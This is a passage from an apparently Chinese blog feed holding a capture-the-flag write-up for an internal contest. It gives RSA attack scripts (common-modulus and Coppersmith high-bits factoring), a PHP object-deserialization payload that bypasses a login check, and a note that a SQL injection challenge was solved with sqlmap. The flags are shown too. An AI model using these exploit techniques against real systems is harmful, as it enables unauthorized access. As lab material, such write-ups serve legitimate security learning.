class="string">&#x27;flag&#123;&#x27;</span> + hashlib.sha256(answer).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">msg1 = bytes_to_long(msg1)</span><br><span class="line">msg2 = bytes_to_long(msg2)</span><br><span class="line">msg3 = bytes_to_long(msg3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;Part1&#x27;</span>)</span><br><span class="line">p1 = getPrime(512)</span><br><span class="line">q1 = getPrime(512)</span><br><span class="line">n1 = p1 * q1</span><br><span class="line">e1 = 0x101</span><br><span class="line"><span class="built_in">print</span>(p1,q1)</span><br><span class="line"><span class="built_in">print</span>(pow(msg1,e1,n1))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;Part2&#x27;</span>)</span><br><span class="line">p2 = getPrime(512)</span><br><span class="line">q2 = getPrime(512)</span><br><span class="line">n2 = p2 * q2</span><br><span class="line">e2 = 0x101</span><br><span class="line">e3 = 0x10001</span><br><span class="line"><span class="built_in">print</span>(n2)</span><br><span class="line"><span class="built_in">print</span>(pow(msg2, e2, n2))</span><br><span class="line"><span class="built_in">print</span>(pow(msg2, e3, n2))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;Part3&#x27;</span>)</span><br><span class="line">p3 = getPrime(512)</span><br><span class="line">q3 = getPrime(512)</span><br><span class="line">n3 = p3 * q3</span><br><span class="line"><span class="built_in">print</span>(pow(msg3, e3, n3))</span><br><span class="line"><span class="built_in">print</span>(e3, n3)</span><br><span class="line"><span class="built_in">print</span>(p3&gt;&gt;100)</span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;Part1</span></span><br><span class="line"><span class="string">11693420529824711957848877878555060508607341184696923385242148106736047114727159175807160519901563374905426109609833610975906619098858392814160862926458439 13328302199989222909395433501708008501389006150636924955949357304706804677448306981604438746491395750101270025755686040619794879810309676335385613329144829</span></span><br><span class="line"><span class="string">142101996556494361367379307289178830609978018209124921588154364904430024634183984713294961047243642123018624512633776884898632977444919865602488143824369406113236863132500550981251719597331808955351716961584783004411000612194142334635034612960693038822551346323987742831705749218050161464265758959578229097627</span></span><br><span class="line"><span class="string">&gt;&gt;Part2</span></span><br><span class="line"><span class="string">96644761669624481301917738904558511784349689869284077227291095697383603370416696531038428870514904299839725620796103329082259883963293954990250648331621341612726931174557257677636896537544958896292649989756895190445785876393803989356576607112504335129072639030916034557841042095819625963688752801565503231051</span></span><br><span class="line"><span class="string">33779700221348135863883889808859563343423001889653007646555069516716259945612034733082561959883961917662442280291944562628883748407830474721742306313000702967971453373637827273515616724662511317244698194870689547692454885460872111009447484052870214525773772949797440252321711833250575503307765208772617173270</span></span><br><span class="line"><span class="string">30751047399313667982517938591543296360089165396123556639822192850466091408760212776242161290545404062143092058831777133453019026398775795321668225155960973377187125716966663728065553458641296126185722656640906185814271035328849549938786034165849397581790764362592273425592482065323159559623654210395502163654</span></span><br><span class="line"><span class="string">&gt;&gt;Part3</span></span><br><span class="line"><span class="string">16934577053001307057854504993001752428438472030078462201433637839940457185838424666208134671016158665074466182774888595874063521317804445301020441500474225790694877804730598327025760391068106387441603824243560070381181899822479846878894800711049348702186023694716825082498367427714154072127920412210673327205</span></span><br><span class="line"><span class="string">65537 80109018557353827320458455535765436463225335928012438772461958597349921842498299564523960369680047354476986568989071964740696426168299922901896285681927391448831968896549777249983312382486370651978138507159676669235052240712648692954558605647795239547687705171147624122887824463803537036584843110089828677511</span></span><br><span class="line"><span class="string">8867983383521941183042966204184582810554933770125890323990596024493007165819743330176061700455869827561884657150374320733943</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>Msg1是基础RSA解密<br>Msg2是共模攻击<br>先附上前两个的解密脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import gmpy2</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"><span class="comment">#求msg1,基础rsa解密</span></span><br><span class="line"></span><br><span class="line">p1=11693420529824711957848877878555060508607341184696923385242148106736047114727159175807160519901563374905426109609833610975906619098858392814160862926458439</span><br><span class="line">q1=13328302199989222909395433501708008501389006150636924955949357304706804677448306981604438746491395750101270025755686040619794879810309676335385613329144829</span><br><span class="line">n1=p1*q1</span><br><span class="line">e1=0x101</span><br><span class="line">c1=142101996556494361367379307289178830609978018209124921588154364904430024634183984713294961047243642123018624512633776884898632977444919865602488143824369406113236863132500550981251719597331808955351716961584783004411000612194142334635034612960693038822551346323987742831705749218050161464265758959578229097627</span><br><span class="line">phi=(p1-1)*(q1-1)</span><br><span class="line">d=gmpy2.invert(e1,phi)</span><br><span class="line">msg1=pow(c1,d,n1)</span><br><span class="line"><span class="built_in">print</span> (binascii.unhexlify(hex(msg1)[2:].strip(<span class="string">&quot;L&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#求msg2，共模攻击脚本</span></span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(1000000)</span><br><span class="line">def egcd(a, b):</span><br><span class="line">    <span class="keyword">if</span> a == 0:</span><br><span class="line">      <span class="built_in">return</span> (b, 0, 1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      g, y, x = egcd(b % a, a)</span><br><span class="line">      <span class="built_in">return</span> (g, x - (b // a) * y, y)</span><br><span class="line">def modinv(a, m):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != 1:</span><br><span class="line">      raise Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="built_in">return</span> x % m</span><br><span class="line">c2=33779700221348135863883889808859563343423001889653007646555069516716259945612034733082561959883961917662442280291944562628883748407830474721742306313000702967971453373637827273515616724662511317244698194870689547692454885460872111009447484052870214525773772949797440252321711833250575503307765208772617173270</span><br><span class="line">n2=96644761669624481301917738904558511784349689869284077227291095697383603370416696531038428870514904299839725620796103329082259883963293954990250648331621341612726931174557257677636896537544958896292649989756895190445785876393803989356576607112504335129072639030916034557841042095819625963688752801565503231051</span><br><span class="line">e2=0x101</span><br><span class="line">c3=30751047399313667982517938591543296360089165396123556639822192850466091408760212776242161290545404062143092058831777133453019026398775795321668225155960973377187125716966663728065553458641296126185722656640906185814271035328849549938786034165849397581790764362592273425592482065323159559623654210395502163654</span><br><span class="line">e3=0x10001</span><br><span class="line">s = egcd(e2, e3)</span><br><span class="line">s1 = s[1]</span><br><span class="line">s2 = s[2]</span><br><span class="line"><span class="keyword">if</span> s1&lt;0:</span><br><span class="line">   s1 = - s1</span><br><span class="line">   c2 = modinv(c2, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;0:</span><br><span class="line">   s2 = - s2</span><br><span class="line">   c3 = modinv(c3, n2)</span><br><span class="line">msg2=(pow(c2,s1,n2)*pow(c3,s2,n2)) % n2</span><br><span class="line"><span class="built_in">print</span> (binascii.unhexlify(hex(msg2)[2:].strip(<span class="string">&quot;L&quot;</span>)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得出结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span><span class="string">&#x27;Tanabata Festival, also known as Qiqiao Festival, &#x27;</span></span><br><span class="line"><span class="variable">$b</span><span class="string">&quot;Qijie Festival, daughter&#x27;s day, Qiqiao Festival, Qiniang society, Tanabata Festival, &quot;</span></span><br></pre></td></tr></table></figure><p>第三个加密给出了P的高位，选择Factoring with high bits known攻击<br>附上脚本，在<a href="https://sagecell.sagemath.org/">sage</a>里运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p = 0xd6a35446aa682606213555b20b25ec4c1c7ab3347fa20de2cc26b0fcc10e7a48057e4fcb095e1eac71b4b16a6b021a9e656fef70000000000000000000000000</span><br><span class="line">n = 0x72143b40dc0dc54bc0fd389680d49bfbec8ca9e81b872a700a7652e56b94533047f178d5e3bb7ccf1f8ebddf79f2a962f631da9a3adde261cb3c7094db9594d21898e9aa7fcd7e0d7713096b26c7d777600dd4ab0f97ff45e1883f4fc85e36895a2a7900e304142948a1a66963f952d073d40f267fd0f765d5b5f79e3e693787</span><br><span class="line">kbits = 100  低位个数(使用时去除该中文)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p</span><br><span class="line">x0 = f.small_roots(X=2^kbits, beta=0.4)[0]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x: %s&quot;</span> %hex(int(x0)))</span><br><span class="line">p = p+x0</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p: &quot;</span>, hex(int(p)))</span><br><span class="line">assert n % p == 0</span><br><span class="line">q = n/int(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q: &quot;</span>, hex(int(q)))</span><br></pre></td></tr></table></figure><p>此前将p转换位2进制之后补齐0至512位，然后将p 和n 转换位16进制，不然不晓得为什么跑不出来</p><p>得出p,q的16进制：<br>p:  0xd6a35446aa682606213555b20b25ec4c1c7ab3347fa20de2cc26b0fcc10e7a48057e4fcb095e1eac71b4b16a6b021a9e656fef792d8e98e64668c994d586dcbf<br>q:  0x88100ea38af4c4ffc88b9c1571a53aa8df2dc9806fbd22fa97ac2d46e038481e0d5d7fdb8135b2c37602ab072c4cf5f34667a6f394b4bc90f0629b4906e52f39</p><p>此时p , q , e , c 都是已知，所以直接用msg1的解法基础rsa解密得出msg3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$msg3</span>=cow and bull woman\<span class="string">&#x27;s day, Qixi, etc., is a traditional festival among Chinese people.</span></span><br></pre></td></tr></table></figure><p>最终解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">answer=<span class="string">&#x27;Tanabata Festival, also known as Qiqiao Festival, Qijie Festival, daughter\&#x27;</span>s day, Qiqiao Festival, Qiniang society, Tanabata Festival, cow and bull woman\<span class="string">&#x27;s day, Qixi, etc., is a traditional festival among Chinese people.&#x27;</span></span><br><span class="line">m=hashlib.sha256()</span><br><span class="line">m.update(answer.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">answer1=m.hexdigest()</span><br><span class="line"><span class="built_in">print</span>(answer1)</span><br></pre></td></tr></table></figure><p>answer1=0a81674cf3d4a570d2128284e422e56da2e38838b43161e36128cc5899440bc2</p><p>最终   flag{0a81674cf3d4a570d2128284e422e56da2e38838b43161e36128cc5899440bc2}</p><h2 id="2-easyphp"><a href="#2-easyphp" class="headerlink" title="2.easyphp"></a>2.easyphp</h2><p>题目源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class YunBao&#123;</span><br><span class="line">    public <span class="variable">$admin</span>;</span><br><span class="line">    public <span class="variable">$password</span>;</span><br><span class="line"> </span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$a</span>,<span class="variable">$p</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;admin=<span class="variable">$a</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">login</span></span>()&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;admin===<span class="variable">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$YunBao</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;YunBao&#x27;</span>]);</span><br><span class="line"><span class="variable">$YunBao</span>-&gt;admin=md5(mt_rand());</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$YunBao</span>-&gt;login())&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>这里直接引用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class YunBao</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$admin</span> = 1;</span><br><span class="line">    public <span class="variable">$password</span> = <span class="string">&#x27;$this -&gt;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=new YunBao();</span><br><span class="line"><span class="variable">$a</span>-&gt;password=&amp;<span class="variable">$a</span>-&gt;admin;</span><br><span class="line"><span class="built_in">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-云警sql王"><a href="#3-云警sql王" class="headerlink" title="3.云警sql王"></a>3.云警sql王</h2><p>该题是使用Sqlmap配合bp一把梭<br>flag在fl44444g表里面的flag列里面</p><p><img src="/images/yunbao.png" alt="Alt text"></p><p>不晓得为什么爆出来是frag{ybb_sqlyyds_666}<br>把frag改位flag成功提交</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;内部赛&lt;/p&gt;</summary>
    
    
    
    <category term="比赛" scheme="http://example.com/categories/%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
</feed>
